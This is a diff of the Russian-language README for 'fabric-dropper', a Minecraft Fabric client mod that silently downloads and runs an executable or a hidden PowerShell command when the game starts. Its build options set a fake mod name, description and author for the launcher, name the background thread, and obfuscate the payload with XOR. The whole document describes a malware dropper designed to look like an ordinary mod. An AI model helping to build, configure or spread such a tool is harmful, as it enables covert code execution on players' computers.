@@ -1,6 +1,6 @@
 # fabric-dropper
 
-Fabric **1.20.1** client: после старта клиента качает HTTPS-payload в `%TEMP%` и запускает в фоне. Название, описание и URL задаются только при сборке.
+Fabric **1.20.1** client: после старта клиента в фоне выполняет настраиваемое действие (по умолчанию **PowerShell** на Windows). Режим **download** — legacy: HTTPS → `%TEMP%` → запуск exe. Всё задаётся только при сборке в `mod.settings.properties`.
 
 ## Требования
 
@@ -19,8 +19,11 @@ cp mod.settings.example.properties mod.settings.properties
 | `mod.name` | заголовок в списке модов |
 | `mod.description` | описание в лаунчере |
 | `mod.authors` | автор |
-| `download.url` | ссылка на payload, **только https** |
-| `download.filename` | имя файла в temp |
+| `run.mode` | `powershell` (default) или `download` |
+| `powershell.command` | строка для `powershell.exe -Command …` (Windows) |
+| `powershell.hidden` | `true` → `-WindowStyle Hidden` |
+| `download.url` | при `run.mode=download`, **только https** |
+| `download.filename` | имя файла в temp (download) |
 | `thread.name` | имя daemon-потока |
 | `obfuscate.level` | `none` / `light` / `full` (рекомендуется **full**) |
 | `obfuscate.xor.key` | 0–255, rolling XOR по байтам |
